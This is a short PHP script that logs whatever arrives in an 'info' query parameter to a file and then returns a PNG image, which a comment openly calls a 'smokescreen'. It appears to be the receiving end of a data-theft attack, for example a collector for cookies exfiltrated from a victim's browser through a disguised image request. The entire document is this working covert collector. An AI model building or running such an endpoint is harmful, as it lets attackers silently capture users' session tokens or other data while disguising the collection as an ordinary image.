<?php
// log info
$info = isset($_GET['info']) ? $_GET['info'] : 'No Info';
$info = date('Y-m-d H:i:s -- ') . $info . PHP_EOL;
$file = __DIR__ . '/info.log';
file_put_contents($file, $info, FILE_APPEND);
// generate an image as a smokescreen
header('Content-Type: image/png');
readfile(__DIR__ . '/Barack_Obama.png');
